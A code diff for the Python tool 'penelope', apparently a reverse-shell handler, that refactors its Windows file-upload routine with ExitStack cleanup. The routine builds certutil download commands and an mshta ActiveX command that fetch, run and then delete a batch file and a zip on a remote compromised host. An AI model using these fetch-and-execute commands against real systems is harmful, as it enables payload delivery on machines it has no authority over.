@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.18.3"
+__version__ = "0.18.4"
 
 import os
 import io
@@ -57,6 +57,7 @@ from datetime import datetime
 from textwrap import indent, dedent
 from binascii import Error as binascii_error
 from functools import wraps
+from contextlib import ExitStack
 from collections import deque, defaultdict
 from http.server import SimpleHTTPRequestHandler
 from urllib.parse import unquote
@@ -3387,10 +3388,6 @@ class Session:
 
 				tar_source, mode = data, "r:gz"
 
-			#print(remote_size)
-			#if not remote_size:
-			#	return []
-
 			# Local extraction
 			try:
 				tar = tarfile.open(mode=mode, fileobj=tar_source)
@@ -3696,73 +3693,77 @@ class Session:
 					return [] # TODO
 
 		elif self.OS == 'Windows':
+			with ExitStack() as stack:
+				# Fire up File Server
+				server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
+				server.start()
+				stack.callback(lambda: server.term.wait(options.short_timeout))
+				stack.callback(lambda: server.stop())
+				server.init.wait(options.short_timeout)
 
-			# Fire up File Server
-			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
-			server.start()
-			server.init.wait(options.short_timeout)
-			if not hasattr(server, 'id'):
-				return []
+				if not hasattr(server, 'id'):
+					return []
 
-			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
-			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
-			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
-				altnames = []
-				for item in resolved_items:
-					if isinstance(item, tuple):
-						filename, data = item
-						if randomize_fname:
-							filename = Path(filename)
-							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
+				tempfile_zip = f'/dev/shm/{rand(16)}.zip'
+				stack.callback(lambda p=tempfile_zip: os.path.exists(p) and os.remove(p))
+				tempfile_bat = f'/dev/shm/{rand(16)}.bat'
+				stack.callback(lambda p=tempfile_bat: os.path.exists(p) and os.remove(p))
+
+				with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
+					altnames = []
+					for item in resolved_items:
+						if isinstance(item, tuple):
+							filename, data = item
+							if randomize_fname:
+								filename = Path(filename)
+								altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
+							else:
+								altname = filename
+							zip_info = zipfile.ZipInfo(filename=str(altname))
+							zip_info.date_time = time.localtime(time.time())[:6]
+							myzip.writestr(zip_info, data)
 						else:
-							altname = filename
-						zip_info = zipfile.ZipInfo(filename=str(altname))
-						zip_info.date_time = time.localtime(time.time())[:6]
-						myzip.writestr(zip_info, data)
-					else:
-						if item.is_dir():
-							altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
-							for p in item.rglob("*"):
-								if not p.is_file():
-									continue
-								rel = p.relative_to(item)
-								altname_file = Path(altname) / rel
-								myzip.write(p, arcname=str(altname_file))
-						else:
-							altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
-							myzip.write(item, arcname=altname)
-					altnames.append(altname)
+							if item.is_dir():
+								altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
+								for p in item.rglob("*"):
+									if not p.is_file():
+										continue
+									rel = p.relative_to(item)
+									altname_file = Path(altname) / rel
+									myzip.write(p, arcname=str(altname_file))
+							else:
+								altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
+								myzip.write(item, arcname=altname)
+						altnames.append(altname)
 
-			urlpath_zip = server.add(tempfile_zip)
+				urlpath_zip = server.add(tempfile_zip)
 
-			dst_escaped = destination.replace('\\', '\\\\')
-			tmp_escaped = self.tmp.replace('\\', '\\\\')
-			temp_remote_file_zip = urlpath_zip.split("/")[-1]
+				dst_escaped = destination.replace('\\', '\\\\')
+				tmp_escaped = self.tmp.replace('\\', '\\\\')
+				temp_remote_file_zip = urlpath_zip.split("/")[-1]
 
-			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
-			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{dst_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
+				fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
+				unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{dst_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
 
-			with open(tempfile_bat, "w") as f:
-				f.write(fetch_cmd + "\n")
-				f.write(unzip_cmd)
+				with open(tempfile_bat, "w") as f:
+					f.write(fetch_cmd + "\n")
+					f.write(unzip_cmd)
 
-			urlpath_bat = server.add(tempfile_bat)
-			temp_remote_file_bat = urlpath_bat.split("/")[-1]
-			response = self.exec(
-				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
-				force_cmd=True, value=True, timeout=None)
-			server.stop()
-			server.term.wait(options.short_timeout)
+				urlpath_bat = server.add(tempfile_bat)
+				temp_remote_file_bat = urlpath_bat.split("/")[-1]
+				response = self.exec(
+					f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
+					force_cmd=True, value=True, timeout=None)
 
-			if not response:
-				logger.error("Upload initialization failed...")
-				return []
-			if not "DOWNLOAD OK" in response:
-				logger.error("Data transfer failed...")
-				return []
-			if not "UNZIP OK" in response:
-				logger.error("Data unpacking failed...")
-				return []
+				if not response:
+					logger.error("Upload initialization failed...")
+					return []
+				if not "DOWNLOAD OK" in response:
+					logger.error("Data transfer failed...")
+					return []
+				if not "UNZIP OK" in response:
+					logger.error("Data unpacking failed...")
+					return []
 
 		# Present uploads
 		uploaded_paths = []
